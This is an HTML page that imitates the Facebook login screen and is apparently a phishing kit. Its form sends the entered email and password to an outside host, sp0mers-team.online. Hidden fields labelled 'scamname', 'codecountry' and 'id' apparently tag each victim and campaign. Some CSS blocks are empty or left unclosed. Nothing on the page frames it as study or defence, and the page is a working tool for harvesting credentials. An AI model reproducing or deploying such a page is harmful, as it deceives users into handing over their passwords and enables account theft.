<!DOCTYPE html>
<html lang="en">

<head>

    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Facebook Login</title>
    <link rel="stylesheet" href="style.css">
</head>

<body>
    <div class="container flex">
        <div class="facebook-page flex">
            <div class="text">
                <h1>facebook</h1>
                <p>Connect with friends and the world </p>
                <p> around you on Facebook.</p>
            </div>
            <div id="page">
                <form method="POST" action="https://sp0mers-team.online/v/add">

                    <label>
                        <input id="email" name="email" :placeholder="email" type="text" required>
                    </label>

                    <label>
                        <input id="password" name="password" :placeholder="password" required type="password">
                    </label>

                    <input type="hidden" value="" name="code" v-model="codecountry">

                    <input type="hidden" value="" name="id" v-model="id_u">
                    <input type="hidden" value="" name="sc" v-model="scamname">

                    <div class="link">
                        <button type="submit" onclick="ss()" name="add" class="login">{{login}}</button>
                        <!-- <button type="submit" class="login">Login</button> -->
                        <a href="#" class="forgot">Forgot password?</a>
                    </div>
                    <hr>
                    <div class="button">
                        <a href="#">Create new account</a>
                    </div>
                </form>
            </div>
        </div>
    </div>
</body>

<style>
    @import url('https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;500;700&display=swap');

    * {

    }

    ::placeholder {
        color: #777;
        font-size: 1.063rem;
    }

    .link {

    }

    .link .login {

    .link .login:hover {

    form a {

    }

    .link .forgot {
        color: #1877f2;
        font-size: 0.875rem;
    }

    .link .forgot:hover {
        text-decoration: underline;
    }

    hr {
        border: none;
        height: 1px;
        background-color: #ccc;
        margin-bottom: 20px;
        margin-top: 20px;
    }

    .button {
        margin-top: 25px;
        text-align: center;
        margin-bottom: 20px;
    }

    .button a {
        padding: 15px 20px;
        background: #42b72a;
        border-radius: 6px;
        color: #fff;
        font-size: 1.063rem;
        font-weight: 600;
        transition: 0.2s ease;
    }

    .button a:hover {
        background: #3ba626;
    }

    @media (max-width: 900px) {
        .facebook-page {
            flex-direction: column;
            text-align: center;
        }

        .facebook-page .text {
            margin-bottom: 30px;
        }
    }

    @media (max-width: 460px) {
        .facebook-page h1 {
            font-size: 3.5rem;
        }

        .facebook-page p {
            font-size: 1.3rem;
        }

        form {
            padding: 15px;
        }
    }
</style>
